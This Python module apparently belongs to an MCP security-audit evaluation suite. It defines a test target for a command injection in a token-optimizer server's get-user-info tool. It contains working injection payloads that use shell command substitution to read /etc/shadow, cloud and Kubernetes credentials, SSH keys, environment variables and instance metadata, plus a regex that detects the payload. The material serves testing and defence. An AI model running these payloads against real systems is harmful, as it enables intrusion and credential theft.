"""CVE-2026-55157: @ooples/token-optimizer-mcp smart_user get-user-info OS command injection.

get-user-info interpolates `username` into the shell string
    getent passwd "${username}" || grep "^${username}:" /etc/passwd
run through execAsync (a shell). A literal `"` closes the double-quote, `;` chains a printf that
emits a 7-field passwd line whose GECOS (field 4) carries a command-substitution `$(...)` output,
and a trailing ` #` comments out the rest (the second ${username} occurrence included). The server
parses parts[4] into `fullName`, so the substitution output surfaces in the tool response. The
substitution runs the read as the server user, so the secret, never the payload, lands in output.
The patched version (5.1.0) runs argv-mode execFileSafe + assertSafeArg, so nothing executes.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-55157-token-optimizer"
PATCHED = "holdout-2026-55157-token-optimizer-patched"
WORKING_DIRECTORY = "/srv"
TOOL = "smart_user"

_PRINTF = '"; printf \'a:b:0:0:%s:d:e\\n\' "$({cmd})" #'

AIM = re.compile(r"\$\(")  # the command-substitution marker every exploit carries, benign does not

# Every command_execution-reachable place the flaw reaches that the server does not read itself and
# that the kit can plant. process-account-identity is excluded: the normal list-users operation
# enumerates /etc/passwd and surfaces the planted account without the flaw (self-reached).
KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "kube-config",
    "run-secrets",
    "k8s-sa-token",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
    "etc-hosts",
    "auth-log",
)


def _read_command(place: Place) -> str:
    kind = place.kind.value
    coord = place.coordinates
    if kind == "file":
        raw = coord.path
        if raw is None:
            assert coord.paths is not None
            raw = coord.paths[0]
        path = resolve_container_path(raw, WORKING_DIRECTORY)
        return f'cat "{path}"'
    if kind == "env":
        return f"printenv {coord.name}"
    if kind == "hostname":
        return "hostname"
    if kind == "http_endpoint":
        assert coord.host is not None and coord.path is not None
        js = (
            'const h=require("http");'
            'h.get({host:"' + coord.host + '",port:80,path:"' + coord.path + '"},'
            'r=>{let d="";r.on("data",c=>d+=c);'
            'r.on("end",()=>process.stdout.write(d))}).on("error",()=>{})'
        )
        return "node -e '" + js + "'"
    raise ValueError(f"no read command for kind {kind}")


def _payload(place: Place) -> str:
    return _PRINTF.format(cmd=_read_command(place))


async def _call(client: MCPClientPort, username: str) -> None:
    await client.call_tool(
        TOOL, {"operation": "get-user-info", "username": username, "useCache": False}
    )


def _exploit_for(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def exploit(places: Places, client: MCPClientPort) -> None:
        await _call(client, _payload(places[place_id]))

    exploit.__name__ = f"exploit_{place_id.replace('-', '_')}"
    return exploit


async def _benign(places: Places, client: MCPClientPort) -> None:
    await _call(client, "root")


TARGET = CVETarget(
    cve_id="CVE-2026-55157",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE,),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory=WORKING_DIRECTORY, has_network=False
    ),
    builder=command_injection_env,
    exploits=tuple(_exploit_for(pid) for pid in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: smart_user get-user-info interpolates its username argument into "
        "a shell string run with execAsync, so a username that closes the quoting and adds a "
        "`$(...)` substitution executes an arbitrary command as the server user."
    ),
    tools_filter=None,
    ci_skip_reason=None,
)
